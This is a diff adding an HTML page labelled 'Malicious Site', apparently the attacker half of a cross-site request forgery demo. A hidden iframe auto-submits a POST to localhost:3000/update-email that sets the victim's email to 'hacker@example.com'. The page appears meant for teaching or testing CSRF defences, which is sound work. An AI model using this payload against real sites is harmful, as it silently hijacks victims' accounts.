@@ -1,0 +1,27 @@
+<!-- serverB.html - Malicious Site -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Malicious Site</title>
+</head>
+<body>
+  <h1>Welcome to the Malicious Site</h1>
+  <p>Enjoy our content!</p>
+
+  <!-- Inline iframe with a form that submits immediately -->
+  <iframe title="csrfFrame" style="display: none;" id="csrfFrame" srcdoc="
+    <html>
+      <body>
+        <form action='http://localhost:3000/update-email' method='POST'>
+          <input type='hidden' name='email' value='hacker@example.com'>
+        </form>
+        <script>
+          document.forms[0].submit();
+        </script>
+      </body>
+    </html>
+  "></iframe>
+
+</body>
+</html>
